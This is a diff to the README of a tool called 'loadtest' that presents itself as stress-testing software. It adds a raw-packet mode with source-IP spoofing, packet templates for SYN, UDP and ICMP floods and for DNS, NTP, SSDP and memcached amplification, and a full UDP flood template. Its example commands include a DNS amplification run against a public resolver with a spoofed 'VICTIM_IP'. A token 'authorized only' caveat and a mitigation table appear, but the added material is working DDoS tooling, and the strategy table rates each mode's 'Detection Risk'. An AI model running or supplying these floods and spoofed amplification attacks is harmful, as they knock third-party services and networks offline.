@@ -154,6 +154,9 @@ make build
 | `--use-json` | `false` | Use JSON encoding for rudy |
 | `--use-multipart` | `false` | Use multipart/form-data encoding for rudy |
 | `--evasion-level` | `2` | Evasion level for rudy (1=basic, 2=normal, 3=aggressive) |
+| `--packet-template` | `` | Packet template file for raw strategy |
+| `--spoof-ips` | `` | Comma-separated IPs to spoof (raw strategy) |
+| `--random-spoof` | `false` | Use random source IPs (raw strategy) |
 
 ### Available Load Patterns
 
@@ -170,6 +173,7 @@ make build
 | `heavy-payload` | Parser stress testing | Input validation & parser limits |
 | `rudy` | Persistent slow POST simulation | Session handling validation |
 | `tcp-flood` | Connection pool exhaustion test | Socket limit validation |
+| `raw` | Raw packet template attack (L2/L3/L4) | Protocol-level testing |
 
 ## Examples
 
@@ -1024,6 +1028,117 @@ TCP Options:
   --session-lifetime 5m
 ```
 
+### 11. Raw Packet Template (`--strategy raw`)
+
+**Purpose:** Low-level L2/L3/L4 packet crafting using templates
+
+**How it works:**
+- Loads packet structure from template files
+- Supports dynamic variables (@SIP, @DIP, @SPORT, @DPORT, etc.)
+- Auto-calculates checksums (IP, UDP, TCP, ICMP)
+- Auto-calculates length fields (@LEN, @UDPLEN, @PLEN)
+- Supports both IPv4 and IPv6 packets
+- Uses raw sockets for transmission (requires admin/root)
+
+**Template Variables:**
+
+| Variable | Size | Description |
+|----------|------|-------------|
+| `@DMAC` | 6 | Destination MAC address |
+| `@SMAC` | 6 | Source MAC address |
+| `@SIP` | 4 | Source IPv4 address |
+| `@DIP` | 4 | Destination IPv4 address |
+| `@SIP6` | 16 | Source IPv6 address |
+| `@DIP6` | 16 | Destination IPv6 address |
+| `@SPORT` | 2 | Source port |
+| `@DPORT` | 2 | Destination port |
+| `@LEN` | 2 | IP total length (auto-calculated) |
+| `@PLEN` | 2 | IPv6 payload length (auto-calculated) |
+| `@UDPLEN` | 2 | UDP length (auto-calculated) |
+| `@IPCHK` | 2 | IP header checksum (auto-calculated) |
+| `@UDPCHK` | 2 | UDP checksum (auto-calculated) |
+| `@TCPCHK` | 2 | TCP checksum (auto-calculated) |
+| `@ICMPCHK` | 2 | ICMP checksum (auto-calculated) |
+| `@DATA:N` | N | Random data of N bytes |
+| `GK GG` | 2 | Random source port |
+| `KK KK KK KK` | 4 | Random 4 bytes (e.g., TCP sequence) |
+
+**Available Templates:**
+
+| Template | Description |
+|----------|-------------|
+| `udp_flood.txt` | UDP flood packet |
+| `tcp_syn.txt` | TCP SYN flood |
+| `icmp_echo.txt` | ICMP ping flood |
+| `dns_query.txt` | DNS query flood |
+| `dns_any_query.txt` | DNS ANY query (amplification) |
+| `ntp_monlist.txt` | NTP monlist (amplification) |
+| `ssdp_search.txt` | SSDP M-SEARCH (amplification) |
+| `memcached.txt` | Memcached stats (amplification) |
+| `arp_request.txt` | ARP request flood |
+| `stp_bpdu.txt` | STP BPDU attack |
+| `ipv6_flood.txt` | IPv6 UDP flood |
+| `icmpv6_echo.txt` | ICMPv6 ping flood |
+
+**Example:**
+```bash
+# UDP flood with template
+./loadtest \
+  --target http://192.168.0.100:53 \
+  --strategy raw \
+  --packet-template templates/raw/udp_flood.txt \
+  --sessions 1000 \
+  --rate 500
+
+# TCP SYN flood
+./loadtest \
+  --target http://192.168.0.100:80 \
+  --strategy raw \
+  --packet-template templates/raw/tcp_syn.txt \
+  --sessions 500 \
+  --rate 200
+
+# DNS amplification test (requires authorized reflector)
+./loadtest \
+  --target http://8.8.8.8:53 \
+  --strategy raw \
+  --packet-template templates/raw/dns_any_query.txt \
+  --spoof-ips "VICTIM_IP" \
+  --sessions 100 \
+  --rate 50
+```
+
+**Template Format Example (udp_flood.txt):**
+```
+# L2 :: Ethernet Header
+@DMAC:6  # Destination MAC
+@SMAC:6  # Source MAC
+08 00    # Type: IPv4
+
+# L3 :: IP Header
+45       # Version + IHL
+00       # DSCP
+@LEN:2   # Total Length (auto-calculated)
+00 00    # Identification
+00 00    # Flags + Fragment
+40       # TTL: 64
+11       # Protocol: UDP
+@IPCHK:2 # Checksum (auto-calculated)
+@SIP:4   # Source IP
+@DIP:4   # Destination IP
+
+# L4 :: UDP Header
+GK GG    # Source Port (random)
+@DPORT:2 # Destination Port
+@UDPLEN:2  # UDP Length (auto-calculated)
+@UDPCHK:2  # Checksum (auto-calculated)
+
+# Payload
+@DATA:64 # 64 bytes random data
+```
+
+**Note:** Raw packet attacks require administrator/root privileges. On Windows, raw sockets have limitations and may fall back to UDP sockets.
+
 ### Pulsing Load Patterns
 
 **Purpose:** Stress test auto-scaling systems
@@ -1101,14 +1216,14 @@ Scale DOWN (High -> Low):
 
 ### Strategy Comparison
 
-| Feature | Normal | Keep-Alive | Slowloris | Slow POST | Slow Read | HTTP Flood | H2 Flood | Heavy Payload | TCP Flood |
-|---------|--------|------------|-----------|-----------|-----------|------------|----------|---------------|-----------|
-| **Request Complete** | Yes | Yes | No | Yes | Yes | Yes | Yes | Yes | N/A |
-| **Server Response** | Yes | Yes | No | No | Yes | Yes | Yes | Yes | N/A |
-| **Connection Reuse** | No | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
-| **Resource Exhaustion** | CPU | Connections | Connections | Connections | Memory | CPU/Bandwidth | Streams/CPU | CPU/Parser | Connections |
-| **Detection Risk** | Low | Low | High | Medium | Medium | High | Medium | Low | Medium |
-| **Best For** | Throughput | Real traffic | Connection pool | Upload endpoints | Large responses | Raw volume | Modern infra | App logic | Socket limits |
+| Feature | Normal | Keep-Alive | Slowloris | Slow POST | Slow Read | HTTP Flood | H2 Flood | Heavy Payload | TCP Flood | Raw |
+|---------|--------|------------|-----------|-----------|-----------|------------|----------|---------------|-----------|-----|
+| **Request Complete** | Yes | Yes | No | Yes | Yes | Yes | Yes | Yes | N/A | N/A |
+| **Server Response** | Yes | Yes | No | No | Yes | Yes | Yes | Yes | N/A | N/A |
+| **Connection Reuse** | No | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | No |
+| **Resource Exhaustion** | CPU | Connections | Connections | Connections | Memory | CPU/Bandwidth | Streams/CPU | CPU/Parser | Connections | Network/Kernel |
+| **Detection Risk** | Low | Low | High | Medium | Medium | High | Medium | Low | Medium | High |
+| **Best For** | Throughput | Real traffic | Connection pool | Upload endpoints | Large responses | Raw volume | Modern infra | App logic | Socket limits | Protocol testing |
 
 ### When to Use Each Strategy
 
@@ -1152,6 +1267,13 @@ Scale DOWN (High -> Low):
 - Testing firewall connection tracking tables
 - Evaluating load balancer connection limits
 - Minimal bandwidth, maximum connection impact
+
+**Use Raw when:**
+- Testing at protocol level (L2/L3/L4)
+- Custom packet crafting needed
+- Testing network equipment (firewalls, IDS/IPS)
+- Amplification attack simulation (authorized only)
+- Protocol-specific vulnerability testing
 
 ## Docker Usage
 
@@ -1400,6 +1522,7 @@ If you're testing your own infrastructure, here are recommended mitigations for 
 | HTTP/2 Streams | Configure MAX_CONCURRENT_STREAMS limits |
 | Parser Stress | Input validation, depth limits, regex timeout |
 | Connection Pool | Connection limits per IP, firewall rules |
+| Raw Packet | Rate limiting, ingress filtering (BCP38), IDS/IPS |
 
 ## Future Plans
 
